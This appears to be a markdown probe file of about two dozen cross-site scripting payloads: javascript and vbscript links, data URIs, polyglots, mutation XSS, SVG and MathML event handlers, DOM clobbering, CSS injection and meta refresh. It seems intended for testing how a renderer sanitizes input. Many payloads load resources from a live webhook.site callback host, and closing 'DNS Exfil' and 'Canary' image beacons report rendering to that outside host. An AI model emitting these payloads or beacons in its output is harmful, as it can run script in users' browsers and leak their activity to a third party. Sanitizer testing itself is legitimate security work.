# Security Research - v38

## Advanced Polyglot & Mutation XSS Testing

Testing polyglot payloads, mXSS, and advanced bypass techniques.

---

### 1) JavaScript URL Variations

[js1](javascript:alert(1))

[js2](javascript&#58;alert(1))

[js3](javascript&#x3a;alert(1))

[js4](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))

[js5](jAvAsCrIpT:alert(1))

[js6](java	script:alert(1))

[js7](java
script:alert(1))

[js8](\u006aavascript:alert(1))

---

### 2) VBScript Variations

[vbs1](vbscript:msgbox(1))

[vbs2](vbscript&#58;msgbox(1))

[vbs3](VbScRiPt:msgbox(1))

---

### 3) Data URI Variations

[data1](data:text/html,<script>alert(1)</script>)

[data2](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

[data3](data&#58;text/html,<script>alert(1)</script>)

---

### 4) HTML Polyglot Payloads

<a href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/poly1"<!--><img src=x onerror=alert(1)>-->safe</a>

<a href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/poly2"/**/onclick=alert(1)>click</a>

<a href=javascript:/*</a><img%20src=x%20onerror=alert(1)>//>test</a>

---

### 5) mXSS (Mutation XSS) Attempts

<p id="<img src=x onerror=alert(1)>">mXSS test 1</p>

<noscript><img src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/noscript.gif"></noscript>

<math><mi><mglyph><svg><a xlink:href="javascript:alert(1)"><text>mXSS</text></a></svg></mglyph></mi></math>

---

### 6) SVG-Based XSS

<svg onload="alert(1)">

<svg><script>alert(1)</script></svg>

<svg><foreignObject><script>alert(1)</script></foreignObject></svg>

<svg><animate onbegin=alert(1)></svg>

<svg><set onbegin=alert(1)></svg>

---

### 7) MathML XSS

<math><maction actiontype="statusline#http://evil.com">CLICK<mtext>XSS</mtext></maction></math>

<math href="javascript:alert(1)">click</math>

---

### 8) Template Element Injection

<template><script>alert(1)</script></template>

<template><img src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/template.gif"></template>

---

### 9) Slot Element Injection

<slot name="<img src=x onerror=alert(1)>">slot content</slot>

---

### 10) Custom Element Testing

<x-custom onclick="alert(1)">custom element</x-custom>

<img-x src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/custom-img.gif">

---

### 11) DOM Clobbering Attempts

<form id="document"><input name="cookie" value="clobbered"></form>

<img name="location" src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/dom-clob.gif">

<a id="location" href="https://evil.com">clobbered link</a>

<form id="window"><input name="document"></form>

---

### 12) CSS Injection via Attributes

<div style="background-image:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/css-bg.gif)">css bg</div>

<div style="behavior:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/htc.htc)">htc</div>

<div style="-moz-binding:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/xbl.xml)">xbl</div>

<div style="expression(alert(1))">expression</div>

---

### 13) Import/Include Injection

<link rel="import" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/import.html">

<link rel="stylesheet" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/style.css">

<link rel="prefetch" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/prefetch.html">

---

### 14) Meta Refresh/Redirect

<meta http-equiv="refresh" content="0;url=https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/meta-refresh">

<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

---

### 15) Object/Embed with Data

<object data="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/object.swf">
<embed src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/embed.swf">

<object type="text/x-scriptlet" data="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/scriptlet.sct">

---

### 16) Applet Tag (Legacy)

<applet code="XSS" codebase="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/">

---

### 17) Marquee/BGSOUND (IE Legacy)

<marquee onstart="alert(1)">XSS</marquee>

<bgsound src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/bgsound.wav">

---

### 18) Isindex (Deprecated)

<isindex action="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/isindex">

---

### 19) Keygen Element

<keygen autofocus onfocus="alert(1)">

---

### 20) Details/Summary XSS

<details open ontoggle="alert(1)">
<summary>Click me</summary>
Content
</details>

---

### 21) Output Element

<output name="result" for="a b">XSS</output>

---

### 22) Menu/MenuItem

<menu type="context" id="mymenu">
<menuitem label="XSS" onclick="alert(1)"></menuitem>
</menu>

---

### DNS Exfil

![dns](https://v38-dns.2fe47d02-b825-4774-a39b-e7be4327f4e8.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/v38-canary.gif)

---

*v38 - Advanced polyglot & mutation XSS testing*
